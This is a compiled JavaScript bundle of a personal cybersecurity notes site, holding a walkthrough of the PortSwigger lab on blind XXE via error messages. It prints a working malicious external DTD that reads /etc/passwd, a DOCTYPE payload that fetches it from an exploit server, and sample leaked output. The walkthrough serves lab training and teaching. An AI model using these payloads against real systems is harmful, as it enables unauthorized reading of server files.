"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[4356],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var r=n(67294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var s=r.createContext({}),p=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(s.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,a=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),m=i,g=u["".concat(s,".").concat(m)]||u[m]||d[m]||a;return n?r.createElement(g,o(o({ref:t},c),{},{components:n})):r.createElement(g,o({ref:t},c))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var a=n.length,o=new Array(a);o[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:i,o[1]=l;for(var p=2;p<a;p++)o[p]=n[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},25150:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return p},toc:function(){return c},default:function(){return u}});var r=n(87462),i=n(63366),a=(n(67294),n(3905)),o=["components"],l={tags:["blind","XXE"],image:"https://cdn.acunetix.com/wp-content/uploads/2017/07/11110651/XXE_600x315.png"},s=void 0,p={unversionedId:"portswigger/XXE/Blind-XXE-with-error-messages",id:"portswigger/XXE/Blind-XXE-with-error-messages",title:"Blind-XXE-with-error-messages",description:"Exploiting blind XXE to retrieve data via error messages",source:"@site/docs/portswigger/XXE/Blind-XXE-with-error-messages.md",sourceDirName:"portswigger/XXE",slug:"/portswigger/XXE/Blind-XXE-with-error-messages",permalink:"/Cybernotes/docs/portswigger/XXE/Blind-XXE-with-error-messages",tags:[{label:"blind",permalink:"/Cybernotes/docs/tags/blind"},{label:"XXE",permalink:"/Cybernotes/docs/tags/xxe"}],version:"current",frontMatter:{tags:["blind","XXE"],image:"https://cdn.acunetix.com/wp-content/uploads/2017/07/11110651/XXE_600x315.png"},sidebar:"tutorialSidebar",previous:{title:"Blind XXE",permalink:"/Cybernotes/docs/portswigger/XXE/Blind XXE"},next:{title:"Exploiting-blind-XXE-by-repurposing-a-local-DTD",permalink:"/Cybernotes/docs/portswigger/XXE/Exploiting-blind-XXE-by-repurposing-a-local-DTD"}},c=[{value:"Exploiting blind XXE to retrieve data via error messages",id:"exploiting-blind-xxe-to-retrieve-data-via-error-messages",children:[],level:2},{value:"Challenge",id:"challenge",children:[],level:2}],d={toc:c};function u(e){var t=e.components,l=(0,i.Z)(e,o);return(0,a.kt)("wrapper",(0,r.Z)({},d,l,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"exploiting-blind-xxe-to-retrieve-data-via-error-messages"},"Exploiting blind XXE to retrieve data via error messages"),(0,a.kt)("p",null,"An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response."),(0,a.kt)("p",null,"You can trigger an XML parsing error message containing the contents of the ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," file using a malicious external DTD as follows:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM    \'file:///nonexistent/%file;\'>">\n%eval;\n%error;\n')),(0,a.kt)("p",null,"This DTD carries out the following steps:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Defines an XML parameter entity called ",(0,a.kt)("inlineCode",{parentName:"li"},"file"),", containing the contents of the ",(0,a.kt)("inlineCode",{parentName:"li"},"/etc/passwd")," file."),(0,a.kt)("li",{parentName:"ul"},"Defines an XML parameter entity called ",(0,a.kt)("inlineCode",{parentName:"li"},"eval"),", containing a dynamic declaration of another XML parameter entity called ",(0,a.kt)("inlineCode",{parentName:"li"},"error"),". The ",(0,a.kt)("inlineCode",{parentName:"li"},"error")," entity will be evaluated by loading a nonexistent file whose name contains the value of the ",(0,a.kt)("inlineCode",{parentName:"li"},"file")," entity."),(0,a.kt)("li",{parentName:"ul"},"Uses the ",(0,a.kt)("inlineCode",{parentName:"li"},"eval")," entity, which causes the dynamic declaration of the ",(0,a.kt)("inlineCode",{parentName:"li"},"error")," entity to be performed."),(0,a.kt)("li",{parentName:"ul"},"Uses the ",(0,a.kt)("inlineCode",{parentName:"li"},"error")," entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the ",(0,a.kt)("inlineCode",{parentName:"li"},"/etc/passwd")," file.")),(0,a.kt)("p",null,"Invoking the malicious external DTD will result in an error message like the following:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n")),(0,a.kt)("h2",{id:"challenge"},"Challenge"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},'This lab has a "Check stock" feature that parses XML input but does not display the result.\nTo solve the lab, use an external DTD to trigger an error message that displays the contents of the ',(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," file.\nThe lab contains a link to an exploit server on a different domain where you can host your malicious DTD.")),(0,a.kt)("p",null,"--\x3e so first of all we have to make our malicious dtd file so let's goto ",(0,a.kt)("inlineCode",{parentName:"p"},"exploit server")," and add this payload:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM    \'file:///nonexistent/%file;\'>">\n%eval;\n%error;\n')),(0,a.kt)("p",null,"--\x3e Also don't forget to change the ",(0,a.kt)("inlineCode",{parentName:"p"},"Content-type")," to ",(0,a.kt)("inlineCode",{parentName:"p"},"application/xml-dtd")," because we are passing xml data."),(0,a.kt)("p",null,"--\x3e Now click on ",(0,a.kt)("inlineCode",{parentName:"p"},"store")," and we have made our external dtd file and also i named it ",(0,a.kt)("inlineCode",{parentName:"p"},"exploit.dtd")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(18304).Z,width:"1423",height:"895"})),(0,a.kt)("p",null,"--\x3e After that goto main application and click on any product and intercept the ",(0,a.kt)("inlineCode",{parentName:"p"},"check store")," request and add the payload which will make request to our external dtd payload So i made this payload:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<exploit-server-url>/exploit.dtd"> %xxe;]>\n')),(0,a.kt)("p",null,"So the final payload will look like this:"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(31634).Z,width:"1495",height:"725"})),(0,a.kt)("p",null,"Now right click on request and select ",(0,a.kt)("inlineCode",{parentName:"p"},"Do intercept->response to this request")," and forward the request. And you will see the content of ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," in response."),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(1366).Z,width:"1275",height:"689"})),(0,a.kt)("p",null,"And we solved the lab!"))}u.isMDXComponent=!0},31634:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220303114920-420bf58c7b058690ade0dd73a331480c.png"},18304:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220303115446-b8991869b93a5104cdca52635943ae17.png"},1366:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220303121031-c971dde7bd4d3579934657e08d18506c.png"}}]);